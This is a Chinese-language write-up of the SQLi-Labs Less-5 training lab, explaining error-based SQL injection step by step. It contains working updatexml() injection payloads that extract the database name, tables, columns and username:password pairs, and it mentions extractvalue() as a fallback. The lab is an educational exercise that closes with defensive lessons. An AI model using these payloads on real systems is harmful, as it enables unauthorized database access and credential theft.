SQLi-Labs Less-5

2026年9月25日 SQLi-Labs Web安全 SQL注入 报错注入

一、题目信息

  • 题目名称：SQLi-Labs Less-5 (GET - Double Injection - Single Quotes - String)
  • 题目平台：SQLi-Labs 本地靶场
  • 题目类型：Web安全 / SQL注入 / 报错注入
  • 靶场链接：http://localhost:8081/Less-5/（本地环境）
  • 涉及工具：Chrome浏览器

二、解题步骤

1. 分析题目考什么

本题的核心考点是报错注入（Error-Based Injection）。与 Less-1 到 Less-4 不同，Less-5 的页面不再回显数据库查询结果，仅显示 "You are in..........."。因此，union select 联合查询失效。但服务器会输出报错信息，攻击者可以利用 updatexml() 或 extractvalue() 函数，在报错信息中夹带数据库数据。

2. 怎么想（破题思路）

  • 访问页面，尝试 ?id=1' 报错，确认存在注入点。
  • 尝试 ?id=-1' union select 1,2,3 --+，发现页面只回显 "You are in..........."，数字 2 和 3 没有出现。说明无法使用联合注入。
  • 既然有报错，就利用报错注入。MySQL 的 updatexml(XML_document, XPath_string, new_value) 函数在 XPath 解析失败时会报错，并输出错误内容。
  • 构造 Payload：?id=1' and updatexml(1, concat(0x7e, (子查询), 0x7e), 1) --+，让报错信息中包含我们要查的数据。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：惯性使用 Union 联合注入

踩坑情况：在 Less-5 中继续使用 ?id=-1' union select 1,database(),3 --+，结果页面只显示 "You are in..........."，看不到数据库名。

原因分析：Less-5 的 PHP 代码只判断了查询是否成功（回显 "You are in..."），没有把查询结果打印出来。

改进方式：放弃联合注入，改用报错注入。

踩坑记录二：报错信息长度限制

踩坑情况：使用 updatexml 报错时，如果查询结果太长，页面只报错前 32 个字符（如爆出 `Dumb:Dumb,Angelina:I-kill-you,D...` 截断）。

原因分析：updatexml() 的报错回显有长度限制（通常是 32 位字符）。

改进方式：使用 group_concat() 把多行结果合并成一行，或者配合 substr() 分段读取。本题中 group_concat 刚好够用。

详细实操步骤（逐字解析）

第一步：测试注入点

?id=1' --+

逐字解析：单引号闭合，页面报错，说明注入点存在。

第二步：爆出数据库名

?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+

逐字解析：updatexml(1, XPath_string, 1) 需要 3 个参数。第二个参数必须是合法的 XPath 格式，否则报错。我们用 concat(0x7e, (database()), 0x7e) 构造出 `~security~`，这不符合 XPath 语法，所以报错并输出 `XPATH syntax error: '~security~'`。

第三步：爆出表名

?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+

逐字解析：在 concat 里放入子查询，报错信息中就会显示所有表名。

第四步：爆出字段名

?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1) --+

逐字解析：查 users 表的列名。

第五步：爆出账号密码

?id=1' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) --+

逐字解析：0x3a 是冒号，用于分隔账号和密码，直接在报错信息中爆出最终数据。

4. 怎么迁移（跨领域联想）

  • API 接口安全测试：现代 API 如果返回了详细的错误堆栈信息（Stack Trace），相当于给攻击者提供了报错注入的便利。生产环境应关闭详细错误显示。
  • 日志分析与安全监控：报错信息如果被记录到日志中，且包含敏感数据，会导致二次泄露。安全开发应在全局异常处理器中屏蔽数据库报错细节。
  • 漏洞利用的等价性：在安全领域，一条路堵了（联合查询），通常会有另一条路（报错注入），这体现了攻防的对抗性。

三、名词大全与原理深度复盘

1. 报错注入（Error-Based Injection）

指后端不仅没有过滤用户输入，还将数据库的报错信息直接输出到前端页面。攻击者利用报错函数，故意制造语法错误，让错误信息中夹带数据库数据，从而绕过“无回显”的限制。

2. updatexml() 函数

MySQL 用于更新 XML 文档的函数。因为它在解析 XPath 时如果发现格式错误就会抛出异常，且异常信息里会包含试图解析的内容，因此被攻击者广泛用于报错注入。

3. concat() 与 0x7e

concat 是拼接函数，用于把多个字符串合并。0x7e 是波浪号 `~`，在 XPath 中作为非法字符，用来触发报错，并且方便攻击者在报错信息中一眼找到自己的数据。

4. extractvalue() 函数

与 updatexml 类似，也是用于 XML 查询的函数。extractvalue(1, concat(0x7e, (子查询), 0x7e)) 同样可以触发报错并回显数据。如果 updatexml 被过滤，可以换这个。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Less-1 ~ Less-4 的区别：前四关是联合注入，页面有回显位；Less-5 是报错注入，页面无回显，靠报错信息输出。
  • 与盲注的区别：报错注入是“有回显的盲注”，页面虽然不回显查询结果，但会输出报错信息。而布尔盲注和时间盲注是真的什么都不回显。

2. 这种题目的出现原因

开发人员开启了 PHP 的 display_errors，并直接使用了没有过滤输入的 SQL 查询。当 SQL 报错时，错误信息直接显示在网页上，这就给攻击者留下了数据泄露的通道。

3. 这种应用在实际中如何体现？

在真实渗透中，如果遇到无回显的 SQL 注入点，攻击者首先会尝试报错注入。利用 `updatexml` 或 `extractvalue`，可以快速爆出数据库结构。一旦数据库结构暴露，后续就是自动化工具（如 SQLMap）的“拖库”表演。

4. 如何抽象理解概念（大白话理解）

把数据库比作一个“不说话的图书管理员”：

  • Less-1（联合注入）：管理员被你套话，直接把书（数据）递给了你。
  • Less-5（报错注入）：管理员不给你书，但你故意把书单格式写错，管理员生气了，大喊：“你写的‘~员工名单~’这行字是错的！”，你就能听到“员工名单”这四个字，从而拿到了数据。

做一道题，就要往自己脑子里装点东西。
